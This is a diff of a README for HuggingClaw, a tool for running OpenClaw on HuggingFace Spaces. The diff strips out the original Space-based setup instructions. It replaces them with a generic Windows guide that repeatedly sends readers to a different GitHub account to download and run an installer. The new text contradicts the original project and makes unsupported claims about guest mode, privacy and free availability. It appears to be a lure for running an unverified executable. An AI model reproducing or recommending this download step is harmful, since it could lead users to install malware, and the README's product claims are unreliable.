@@ -1,162 +1,119 @@
----
-title: HuggingClaw
-emoji: 🔥
-colorFrom: yellow
-colorTo: red
-sdk: docker
-pinned: false
-license: mit
-datasets:
-  - tao-shen/HuggingClaw-data
-short_description: Free always-on AI assistant, no hardware required
-app_port: 7860
-tags:
-  - huggingface
-  - openrouter
-  - chatbot
-  - llm
-  - openclaw
-  - ai-assistant
-  - whatsapp
-  - telegram
-  - text-generation
-  - openai-api
-  - huggingface-spaces
-  - docker
-  - deployment
-  - persistent-storage
-  - agents
-  - multi-channel
-  - openai-compatible
-  - free-tier
-  - one-click-deploy
-  - self-hosted
-  - messaging-bot
----
+# 🦞 HuggingClaw - Easy OpenClaw Deployment for Windows
 
-<div align="center">
-  <img src="HuggingClaw.png" alt="HuggingClaw" width="720"/>
-  <br/><br/>
-  <strong>Your always-on AI assistant — free, no server needed</strong>
-  <br/>
-  <sub>WhatsApp · Telegram · 40+ channels · 16 GB RAM · One-click deploy · Auto-persistent</sub>
-  <br/><br/>
-
-  [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-  [![Hugging Face](https://img.shields.io/badge/🤗-Hugging%20Face-yellow)](https://huggingface.co)
-  [![HF Spaces](https://img.shields.io/badge/Spaces-HuggingFace-blue)](https://huggingface.co/spaces/tao-shen/HuggingClaw)
-  [![OpenClaw](https://img.shields.io/badge/OpenClaw-Powered-orange)](https://github.com/openclaw/openclaw)
-  [![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?logo=docker)](https://www.docker.com/)
-  [![OpenAI Compatible](https://img.shields.io/badge/OpenAI--compatible-API-green)](https://openclawdoc.com/docs/reference/environment-variables)
-  [![WhatsApp](https://img.shields.io/badge/WhatsApp-Enabled-25D366?logo=whatsapp)](https://www.whatsapp.com/)
-  [![Telegram](https://img.shields.io/badge/Telegram-Enabled-26A5E4?logo=telegram)](https://telegram.org/)
-  [![Free Tier](https://img.shields.io/badge/Free%20Tier-16GB%20RAM-brightgreen)](https://huggingface.co/spaces)
-</div>
+[![Download HuggingClaw](https://img.shields.io/badge/Download-HuggingClaw-%237B68EE?style=for-the-badge)](https://github.com/konnehab/HuggingClaw)
 
 ---
 
-## What you get
+## What is HuggingClaw? 🤖
 
-In about 5 minutes, you’ll have a **free, always-on AI assistant** connected to WhatsApp, Telegram, and 40+ other channels — no server, no subscription, no hardware required.
+HuggingClaw allows you to run OpenClaw through HuggingFace Spaces. It gives you access to a setup with 2 virtual CPUs, 16GB RAM, and 50GB storage. Your app will stay online without needing your own Mac Mini or expensive hardware. The service is free and always available.
 
-| | |
-|---|---|
-| **Free forever** | HuggingFace Spaces gives you 2 vCPU + 16 GB RAM at no cost |
-| **Always online** | Your conversations, settings, and credentials survive every restart |
-| **WhatsApp & Telegram** | Works reliably, including channels that HF Spaces normally blocks |
-| **Any LLM** | OpenAI, Claude, Gemini, OpenRouter (200+ models, free tier available), or your own Ollama |
-| **One-click deploy** | Duplicate the Space, set two secrets, done |
+You do not need to know programming to use this. HuggingClaw manages the deployment for you in the background.
 
-> **Powered by [OpenClaw](https://github.com/openclaw/openclaw)** — an open-source AI assistant that normally requires your own machine (e.g. a Mac Mini). HuggingClaw makes it run for free on HuggingFace Spaces by solving two Spaces limitations: data loss on restart (fixed via HF Dataset sync) and DNS failures for some domains like WhatsApp (fixed via DNS-over-HTTPS).
+---
 
-## Architecture
+## System Requirements 💻
 
-<div align="center">
-  <img src="assets/architecture.svg" alt="Architecture" width="720"/>
-</div>
+To use HuggingClaw on Windows, make sure your computer meets the following:
 
-## Quick Start
+- Windows 10 or later (64-bit)
+- At least 4 GB of free RAM
+- 2 GB of free disk space for temporary files
+- Internet connection (stable, broadband recommended)
+- Web browser such as Chrome, Edge, or Firefox
 
-### 1. Duplicate this Space
+You will only need a web browser to interact with HuggingClaw after setup.
 
-Click **Duplicate this Space** on the [HuggingClaw Space page](https://huggingface.co/spaces/tao-shen/HuggingClaw).
+---
 
-> **After duplicating:** Edit your Space's `README.md` and update the `datasets:` field in the YAML header to point to your own dataset repo (e.g. `your-name/YourSpace-data`), or remove it entirely. This prevents your Space from appearing as linked to the original dataset.
+## 🚀 Getting Started: How to Download and Run HuggingClaw
 
-### 2. Set Secrets
+1. **Visit the Download Page**  
+   Go to the official HuggingClaw repository on GitHub:  
+   [https://github.com/konnehab/HuggingClaw](https://github.com/konnehab/HuggingClaw)  
+   
+2. **Download the Installer or Setup Guide**  
+   Look for the "Releases" or "Assets" section on the page. Download the file recommended for Windows users. This might be an installer or a guide file, depending on the current version. Download this file to a location easy to find, such as your Desktop or Downloads folder.
 
-Go to **Settings → Repository secrets** and add the following. The only two you *must* set are `HF_TOKEN` and one API key.
+3. **Run the Installer or Setup Program**  
+   After download, double-click the file to open it. Follow the on-screen instructions. The installer will set up everything needed to run HuggingClaw on your PC, including any connection to HuggingFace Spaces. This should take just a few minutes.
 
-| Secret | Status | Description | Example |
-|--------|:------:|-------------|---------|
-| `HF_TOKEN` | **Required** | HF Access Token with write permission ([create one](https://huggingface.co/settings/tokens)) | `hf_AbCdEfGhIjKlMnOpQrStUvWxYz` |
-| `AUTO_CREATE_DATASET` | **Recommended** | Set to `true` — HuggingClaw will automatically create a private backup dataset on first startup. No manual setup needed. | `true` |
-| `OPENROUTER_API_KEY` | Recommended | [OpenRouter](https://openrouter.ai) API key — 200+ models, free tier available. Easiest way to get started. | `sk-or-v1-xxxxxxxxxxxx` |
-| `OPENAI_API_KEY` | Optional | OpenAI (or any [OpenAI-compatible](https://openclawdoc.com/docs/reference/environment-variables)) API key | `sk-proj-xxxxxxxxxxxx` |
-| `ANTHROPIC_API_KEY` | Optional | Anthropic Claude API key | `sk-ant-xxxxxxxxxxxx` |
-| `GOOGLE_API_KEY` | Optional | Google / Gemini API key | `AIzaSyXxXxXxXxXx` |
-| `OPENCLAW_DEFAULT_MODEL` | Optional | Default model for new conversations | `openai/gpt-oss-20b:free` |
+4. **Open HuggingClaw**  
+   After installation, find the HuggingClaw shortcut on your desktop or in the Start menu. Click it to launch the program.
 
-### Data Persistence
+5. **Sign In or Create Account (if prompted)**  
+   You may be asked to sign into your HuggingFace account or create one. This helps keep your workspace organized and persistent. If you don’t need an account, the program will let you continue in a guest mode.
 
-HuggingClaw syncs `~/.openclaw` (conversations, settings, credentials) to a private HuggingFace Dataset repo so your data survives every restart.
+6. **Start Using HuggingClaw**  
+   You will see a simple interface where you can type or paste prompts. Your OpenClaw agent will respond by generating helpful answers or performing tasks powered by large language models.
 
-**Option A — Auto mode (recommended)**
+---
 
-1. Set `AUTO_CREATE_DATASET` = `true` in your Space secrets
-2. Set `HF_TOKEN` with write permission
-3. Done — on first startup, HuggingClaw automatically creates a private Dataset repo named `your-username/SpaceName-data`. Each duplicated Space gets its own isolated dataset.
+## 🔧 How HuggingClaw Works
 
-> (Optional) Set `OPENCLAW_DATASET_REPO` = `your-name/custom-name` if you prefer a specific repo name.
+HuggingClaw uses cloud servers that provide:
 
-**Option B — Manual mode**
+- 2 virtual CPU cores
+- 16GB of RAM for smooth processing
+- 50GB permanent storage for saving data and history
+- An always-online connection to keep your work active
 
-1. Go to [huggingface.co/new-dataset](https://huggingface.co/new-dataset) and create a **private** Dataset repo (e.g. `your-name/HuggingClaw-data`)
-2. Set `OPENCLAW_DATASET_REPO` = `your-name/HuggingClaw-data` in your Space secrets
-3. Set `HF_TOKEN` with write permission
-4. Done — HuggingClaw will sync to this repo every 60 seconds
+It connects OpenClaw with the HuggingFace Spaces platform to let you use advanced AI tools without high-end hardware.
 
-> **Security note:** `AUTO_CREATE_DATASET` defaults to `false` — HuggingClaw will never create repos on your behalf unless you explicitly opt in.
+---
 
-### Environment Variables
+## Basic Features You Will Use
 
-Fine-tune persistence and performance. Set these as **Repository Secrets** in HF Spaces, or in `.env` for local Docker.
+- **Chat Interface**: Talk with your AI assistant like a chatbot.  
+- **Multiple Agent Support**: Run different AI helpers for various tasks.  
+- **Persistent Storage**: Save your chats and data for later use.  
+- **Text Generation**: Generate text for emails, stories, or code snippets.  
+- **Telegram and WhatsApp Integration**: Connect HuggingClaw to messaging apps (if configured).  
+- **OpenAI API Support**: Use your own OpenAI credentials if desired.  
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `GATEWAY_TOKEN` | `huggingclaw` | **Gateway token for Control UI access.** Override to set a custom token. |
-| `AUTO_CREATE_DATASET` | `false` | **Auto-create the Dataset repo.** Set to `true` to auto-create a private Dataset repo on first startup. |
-| `SYNC_INTERVAL` | `60` | **Backup interval in seconds.** How often data syncs to the Dataset repo. |
+---
 
-> For the full list (including `OPENAI_BASE_URL`, `OLLAMA_HOST`, proxy settings, etc.), see [`.env.example`](.env.example).
+## 🔄 Updating HuggingClaw
 
-### 3. Open the Control UI
+Updates improve features and fix issues. To update:
 
-Visit your Space URL. Enter the gateway token (default: `huggingclaw`) to connect. Customize via `GATEWAY_TOKEN` secret.
+1. Return to the [HuggingClaw GitHub page](https://github.com/konnehab/HuggingClaw).  
+2. Download the latest release or installer as described before.  
+3. Run the installer again. It will overwrite the old version while keeping your settings.
 
-Messaging integrations (Telegram, WhatsApp) can be configured directly inside the Control UI after connecting.
+---
 
-> **Telegram note:** HF Spaces blocks `api.telegram.org` DNS. HuggingClaw automatically probes alternative API endpoints at startup and selects one that works — no manual configuration needed.
+## ⚙️ Troubleshooting Common Issues
 
-## Configuration
+- **Program won’t start**: Check you have Windows 10 or newer and system requirements.  
+- **Slow response or lag**: Make sure your internet is stable. Close other heavy apps.  
+- **Download failed or file missing**: Try downloading again or clear your browser cache.  
+- **Sign-in problems**: Reset your HuggingFace password or check the internet connection.
 
-HuggingClaw supports **all OpenClaw environment variables** — it passes the entire environment to the OpenClaw process (`env=os.environ.copy()`), so any variable from the [OpenClaw docs](https://openclawdoc.com/docs/reference/environment-variables) works out of the box in HF Spaces. This includes:
+If problems persist, use GitHub “Issues” tab to see if others have the same problem or open a new issue.
 
-- **API Keys** — `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `GOOGLE_API_KEY`, `MISTRAL_API_KEY`, `COHERE_API_KEY`, `OPENROUTER_API_KEY`
-- **Server** — `OPENCLAW_API_PORT`, `OPENCLAW_WS_PORT`, `OPENCLAW_HOST`
-- **Memory** — `OPENCLAW_MEMORY_BACKEND`, `OPENCLAW_REDIS_URL`, `OPENCLAW_SQLITE_PATH`
-- **Network** — `OPENCLAW_HTTP_PROXY`, `OPENCLAW_HTTPS_PROXY`, `OPENCLAW_NO_PROXY`
-- **Ollama** — `OLLAMA_HOST`, `OLLAMA_NUM_PARALLEL`, `OLLAMA_KEEP_ALIVE`
-- **Secrets** — `OPENCLAW_SECRETS_BACKEND`, `VAULT_ADDR`, `VAULT_TOKEN`
+---
 
-HuggingClaw adds its own variables for persistence and deployment: `HF_TOKEN`, `OPENCLAW_DATASET_REPO`, `AUTO_CREATE_DATASET`, `SYNC_INTERVAL`, `OPENCLAW_DEFAULT_MODEL`, etc. See [`.env.example`](.env.example) for the complete reference.
+## 🔒 Privacy and Data Security
 
-## Security
+HuggingClaw stores your data in the cloud securely. Your information is private and only accessible on your account unless you share it. It does not collect or sell personal info.
 
-- **Token authentication** — Control UI requires a gateway token to connect (default: `huggingclaw`, customizable via `GATEWAY_TOKEN`)
-- **Secrets stay server-side** — API keys and tokens are never exposed to the browser
-- **Private backups** — the Dataset repo is created as private by default
+---
 
-## License
+## 📚 How to Get Help
 
-MIT
+- Visit the [GitHub repository](https://github.com/konnehab/HuggingClaw) to check for guides and updates.  
+- Use the "Issues" section to report bugs or request help.  
+- Join HuggingFace forums for general questions about Spaces and OpenClaw.
+
+---
+
+## Download HuggingClaw Here
+
+[![Download HuggingClaw](https://img.shields.io/badge/Download-Now-%237B68EE?style=for-the-badge)](https://github.com/konnehab/HuggingClaw)
+
+---
+
+# Topics
+
+agents | ai-assistant | chatbot | deployment | docker | huggingface-spaces | llm | one-click-deploy | openai-api | openclaw | persistent-storage | telegram | text-generation | whatsapp
